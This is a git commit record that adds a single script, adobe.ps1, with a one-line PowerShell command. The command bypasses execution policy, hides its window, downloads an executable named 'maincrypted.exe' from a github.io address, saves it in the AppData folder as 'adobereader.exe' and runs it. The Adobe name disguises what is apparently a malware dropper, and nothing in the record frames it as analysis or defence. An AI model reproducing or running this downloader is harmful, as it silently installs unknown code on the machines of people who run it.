4e81ee25d806cdb2d1875a6d60a7274ebf5c5810
homemaginalpole <accounting@homemaginalpole.com>
2025-03-27 02:18:32 +0000

    Add files via upload

---
+++ adobe.ps1
@@ -0,0 +1,1 @@
+PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://homemaginalpole.github.io/rawdata/maincrypted.exe','%APPDATA%\adobereader.exe');Start-Process '%APPDATA%\adobereader.exe'
